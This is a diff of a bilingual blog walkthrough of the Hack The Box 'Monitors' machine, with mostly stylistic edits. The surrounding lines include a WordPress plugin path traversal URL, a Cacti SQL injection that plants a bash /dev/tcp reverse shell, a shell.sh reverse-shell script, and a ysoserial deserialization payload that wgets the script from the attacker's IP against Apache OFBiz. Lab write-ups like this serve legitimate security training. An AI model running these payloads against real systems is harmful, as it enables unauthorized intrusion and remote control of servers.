@@ -267,7 +267,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Ya sea porque intuimos que puede haber configuraciones adicionales o porque revisamos minuciosamente los archivos de configuración de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, encontramos pistas sobre la posible existencia de dominios adicionales. Por ejemplo, en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports.conf&lt;/code&gt; se menciona que cualquier cambio de puerto o adición de puertos puede requerir ajustes en la declaración &lt;em&gt;VirtualHost&lt;/em&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/code&gt;. Esto nos recuerda que el servidor está aplicando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; desde el inicio, lo que podría indicar la presencia de dominios que aún desconocemos.&lt;/p&gt;
+&lt;p&gt;Ya sea porque intuimos que puede haber configuraciones adicionales o porque revisamos minuciosamente los archivos de configuración de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, encontramos pistas sobre la posible existencia de dominios adicionales. Por ejemplo, en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports.conf&lt;/code&gt; se menciona que cualquier cambio de puerto o adición de puertos puede requerir ajustes en la declaración &lt;em&gt;VirtualHost&lt;/em&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/code&gt;. Esto nos recuerda que el servidor está aplicando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; desde el inicio, lo que podría indicar la presencia de dominios que aún desconocemos.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -414,9 +414,7 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Al hacerlo, logramos establecer la &lt;em&gt;reverse shell&lt;/em&gt;, obteniendo acceso directo dentro de la máquina.&lt;/p&gt;
-
-&lt;p&gt;Una vez dentro de la máquina, podemos confirmar nuestra presencia en el sistema mediante el comando:&lt;/p&gt;
+&lt;p&gt;Al hacerlo, logramos establecer la &lt;em&gt;reverse shell&lt;/em&gt;, obteniendo acceso directo dentro de la máquina. Una vez dentro de la máquina, podemos confirmar nuestra presencia en el sistema mediante el comando:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hostname -I
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -563,7 +561,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png&quot; alt=&quot;59&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Antes de enviar este segundo &lt;em&gt;payload&lt;/em&gt;, pondremos nuestra máquina en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; para recibir la reverse shell:&lt;/p&gt;
+&lt;p&gt;Antes de enviar este segundo &lt;em&gt;payload&lt;/em&gt;, pondremos nuestra máquina en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; para recibir la &lt;em&gt;reverse shell&lt;/em&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nlvp 443
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -842,7 +840,7 @@
 
 &lt;p&gt;The most relevant findings from this new scan are that the server is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress 5.5.1&lt;/code&gt;, which allows us to identify the content management system in use, and confirms that the server is running on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ubuntu&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt;, we can search for common paths such as admin panels, content directories, and other typical CMS routes.&lt;/p&gt;
+&lt;p&gt;After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WordPress&lt;/code&gt;, we can search for common paths such as admin panels, content directories, and other typical &lt;em&gt;CMS&lt;/em&gt; routes.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -853,11 +851,11 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Among the paths found, we discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin&lt;/code&gt; admin panel; however, attempting to access it with default known credentials will not be effective in this case.&lt;/p&gt;
+&lt;p&gt;Among the paths found, we discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-admin&lt;/code&gt; panel; however, attempting to access it with default known credentials will not be effective in this case.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;We also discovered that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-content&lt;/code&gt; directory is accessible, which represents a configuration error, as this directory contains CMS resources that should be protected. Within this directory, we can perform a second &lt;em&gt;fuzzing&lt;/em&gt; (or alternatively, we could manually search for specific paths), which leads us to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;We also discovered that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wp-content&lt;/code&gt; directory is accessible, which represents a configuration error, as this directory contains &lt;em&gt;CMS&lt;/em&gt; resources that should be protected. Within this directory, we can perform a second &lt;em&gt;fuzzing&lt;/em&gt; (or alternatively, we could manually search for specific paths), which leads us to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plugins&lt;/code&gt; directory.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -874,7 +872,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;, or by searching online in the &lt;em&gt;Exploit Database&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;, or by searching online on &lt;em&gt;Exploit Database&lt;/em&gt;.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit spritz
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -885,19 +883,19 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;To test this, we can create any text file and, using &lt;em&gt;Python&lt;/em&gt;, we can host an HTTP server from the same file path to make it accessible via:&lt;/p&gt;
+&lt;p&gt;To test this, we can create any text file and, using &lt;em&gt;Python&lt;/em&gt;, we can host an &lt;em&gt;HTTP&lt;/em&gt; server from the same file path to make it accessible via:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m http.server 80
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Now, if we point to the URL below, we will see that we can read the contents we wrote in our text file.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&amp;lt;nuestraIP&amp;gt;:80/&amp;lt;nombreArchivo&amp;gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&amp;lt;ourIP&amp;gt;:80/&amp;lt;nombreArchivo&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;However, if we try to load a &lt;em&gt;reverse shell&lt;/em&gt;, it will not execute because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RFI&lt;/code&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt; function, which simply reads the file content as text, without interpreting or executing any PHP code it contains.&lt;/p&gt;
+&lt;p&gt;However, if we try to load a &lt;em&gt;reverse shell&lt;/em&gt;, it will not execute because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RFI&lt;/code&gt; uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt; function, which simply reads the file content as text, without interpreting or executing any &lt;em&gt;PHP&lt;/em&gt; code it contains.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -929,7 +927,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Whether because we suspect there might be additional configurations or because we’ve carefully examined &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&apos;s&lt;/code&gt; configuration files, we find clues about the possible existence of additional domains. For instance, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports.conf&lt;/code&gt; file, it mentions that any port changes or additions may require adjustments to the &lt;em&gt;VirtualHost&lt;/em&gt; declaration in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/code&gt;. This reminds us that the server has been applying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; from the start, which could indicate the presence of domains we are not aware of yet.&lt;/p&gt;
+&lt;p&gt;Whether because we suspect there might be additional configurations or because we’ve carefully examined &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&apos;s&lt;/code&gt; configuration files, we find clues about the possible existence of additional domains. For instance, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ports.conf&lt;/code&gt; file, it mentions that any port changes or additions may require adjustments to the &lt;em&gt;VirtualHost&lt;/em&gt; statement in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apache2/sites-enabled/000-default.conf&lt;/code&gt;. This reminds us that the server has been applying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; from the start, which could indicate the presence of domains we are not aware of yet.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -969,7 +967,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;To check, we can search online in the &lt;em&gt;Exploit Database&lt;/em&gt; or directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;To check, we can search online on &lt;em&gt;Exploit Database&lt;/em&gt; or directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit cacti 1.2.12
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1003,7 +1001,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Now we are interested in listing all the tables in the database; for this, we will use the following payload:&lt;/p&gt;
+&lt;p&gt;Now we are interested in listing all the tables in the database; for this, we will use the following &lt;em&gt;payload&lt;/em&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1028,7 +1026,7 @@
 
 &lt;p&gt;However, there is a second injection that allows us to obtain a &lt;em&gt;reverse shell&lt;/em&gt; inside the machine. This injection is performed as follows:&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UPDATE+settings+SET+value=&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/443 0&amp;gt;&amp;amp;1;&apos;+WHERE+name=&apos;path_php_binary&apos;;--+-
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;amp;filter=1&apos;)+UPDATE+settings+SET+value=&apos;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ourIP&amp;gt;/443 0&amp;gt;&amp;amp;1;&apos;+WHERE+name=&apos;path_php_binary&apos;;--+-
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;By modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path_php_binary&lt;/code&gt; parameter in the &lt;em&gt;settings&lt;/em&gt; table to point to a &lt;em&gt;reverse shell&lt;/em&gt; instead of the PHP executable, we manage to execute our command. This happens because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cacti&lt;/code&gt; uses the value of this parameter in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;host_reindex()&lt;/code&gt; function, located in the file &lt;a href=&quot;https://github.com/Cacti/cacti/blob/develop/host.php&quot;&gt;host.php&lt;/a&gt;. The logic behind this is as follows:&lt;/p&gt;
@@ -1076,9 +1074,7 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;By doing so, we manage to establish the reverse shell, gaining direct access to the machine.&lt;/p&gt;
-
-&lt;p&gt;Once inside the machine, we can confirm our presence in the system using the following command:&lt;/p&gt;
+&lt;p&gt;By doing so, we manage to establish the reverse shell, gaining direct access to the machine. Once inside the machine, we can confirm our presence in the system using the following command:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hostname -I
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1092,9 +1088,9 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -l /var/run/docker.sock
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This shows that the socket is owned by the user &lt;em&gt;root&lt;/em&gt; and the group &lt;em&gt;docker&lt;/em&gt;, indicating that access to the Docker daemon is restricted to these users and members of the &lt;em&gt;docker&lt;/em&gt; group. This means that our current user doesn’t have permission to interact with Docker directly, so commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker info&lt;/code&gt; won’t be effective.&lt;/p&gt;
+&lt;p&gt;This shows that the socket is owned by the user &lt;em&gt;root&lt;/em&gt; and the group &lt;em&gt;docker&lt;/em&gt;, indicating that access to the &lt;em&gt;Docker daemon&lt;/em&gt; is restricted to these users and members of the &lt;em&gt;docker&lt;/em&gt; group. This means that our current user doesn’t have permission to interact with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; directly, so commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker ps&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker info&lt;/code&gt; won’t be effective.&lt;/p&gt;
 
-&lt;p&gt;Another way to confirm if Docker is running is to inspect active processes with:&lt;/p&gt;
+&lt;p&gt;Another way to confirm if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; is running is to inspect active processes with:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps aux | grep dockerd
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1176,7 +1172,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;As we have been doing, we will investigate whether this version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache OFBiz&lt;/code&gt; has any known vulnerabilities that we can exploit. We can do this by searching online, in &lt;em&gt;Exploit Database&lt;/em&gt;, or directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;As we have been doing, we will investigate whether this version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache OFBiz&lt;/code&gt; has any known vulnerabilities that we can exploit. We can do this by searching online, on &lt;em&gt;Exploit Database&lt;/em&gt;, or directly from the console using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit ofbiz 17.12.01
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1192,14 +1188,14 @@
 &lt;p&gt;Next, we will write a &lt;em&gt;reverse shell&lt;/em&gt; in &lt;em&gt;Bash&lt;/em&gt;. This &lt;em&gt;reverse shell&lt;/em&gt; will allow us to gain remote access from the server to our machine. To do this, we will create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; with the following content:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/443 0&amp;gt;&amp;amp;1
+/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;ourIP&amp;gt;/443 0&amp;gt;&amp;amp;1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png&quot; alt=&quot;56&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Next, we will generate the &lt;em&gt;payload&lt;/em&gt; in &lt;em&gt;JAR&lt;/em&gt; format, using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsBeanutils1&lt;/code&gt; class. This class is part of &lt;em&gt;Apache Commons&lt;/em&gt; and has been exploited in the past to execute arbitrary code in serialized objects. By using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; together with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsBeanutils1&lt;/code&gt;, we can embed commands into a serialized object that the server will execute when it &lt;em&gt;deserializes&lt;/em&gt; it. In this case, the &lt;em&gt;payload&lt;/em&gt; is designed so that the server will download our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; file into the victim machine’s temporary directory (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;). We will encode the output of the &lt;em&gt;payload&lt;/em&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; to facilitate transmission and avoid issues during the process:&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar ysoserial-all.jar CommonsBeanutils1 &quot;wget &amp;lt;nuestraIP&amp;gt;/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;; echo
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar ysoserial-all.jar CommonsBeanutils1 &quot;wget &amp;lt;ourIP&amp;gt;/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;; echo
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png&quot; alt=&quot;57&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
@@ -1214,7 +1210,7 @@
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns=&apos;http://ws.apache.org/xmlrpc/namespaces/extensions&apos;&amp;gt; PAYLOAD &amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H &apos;Content-Type:application/xml&apos; &amp;amp;&amp;gt;/dev/null
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Here, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAYLOAD&lt;/code&gt; is the &lt;em&gt;base64&lt;/em&gt; content that we generated in the previous step.&lt;/p&gt;
+&lt;p&gt;Here, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAYLOAD&lt;/code&gt; is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; content that we generated in the previous step.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png&quot; alt=&quot;58&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -1225,7 +1221,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png&quot; alt=&quot;59&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
